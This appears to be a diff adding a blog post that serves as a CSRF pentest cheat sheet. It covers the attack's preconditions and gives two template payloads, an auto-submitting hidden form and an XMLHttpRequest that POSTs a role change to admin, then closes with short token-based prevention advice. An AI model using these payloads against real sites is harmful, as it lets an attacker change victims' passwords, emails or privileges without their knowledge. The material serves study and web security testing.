@@ -1,0 +1,75 @@
+---
+title: "CSRF attack"
+subtitle: ""
+date: 2020-03-04T15:58:26+08:00
+lastmod: 2020-03-04T15:58:26+08:00
+draft: false
+author: "Hato0"
+description: "CSRF cheatsheet"
+
+tags: ["web", "penetest", "csrf"]
+categories: ["Penetest - Web"]
+
+hiddenFromHomePage: false
+hiddenFromSearch: false
+twemoji: false
+lightgallery: false
+ruby: false
+fraction: true
+fontawesome: true
+linkToMarkdown: true
+rssFullText: false
+toc:
+  enable: true
+  auto: true
+code:
+  copy: true
+  maxShownLines: 50
+share:
+  enable: true
+comment:
+  enable: true
+---
+# Cross-site request forgery
+
+Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. This attack can happend by phishing, clone site, etc ... Conditions have to be present for this attack  to be perform : 
+
+-   **A relevant action.** : Change password, email, rights, ...
+-   **Cookie-based session handling.** : Website with cookie base for sessions are an incredible candidate for this type of attack
+-   **No unpredictable request parameters.** Every element should be known or obtainable to be able to forge the request
+
+Here is a schema to check for CSRF from PATT:
+
+![alt CSRF_Detection](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/CSRF%20Injection/Images/CSRF-CheatSheet.png?raw=true)
+
+
+## Some examples
+
+- No defenses
+    {{< highlight html "lineNos=false" >}}
+<form method="$method" action="$url">  
+    <input type="hidden" name="$param1name" value="$param1value">  
+</form>  
+<script>  
+    document.forms\[0\].submit();  
+</script>
+    {{< /highlight >}}
+
+- JSon and JS combined
+
+    {{< highlight javascript "lineNos=false" >}}
+<script>
+var xhr \= new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+xhr.setRequestHeader("Content-Type", "text/plain");
+//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+//xhr.setRequestHeader("Content-Type", "multipart/form-data");
+xhr.send('{"role":admin}');
+</script>
+    {{< /highlight >}}
+
+## How to prevent them 
+
+-   Unpredictable with high entropy, as for session tokens in general.
+-   Tied to the user's session.
+-   Strictly validated in every case before the relevant action is executed.
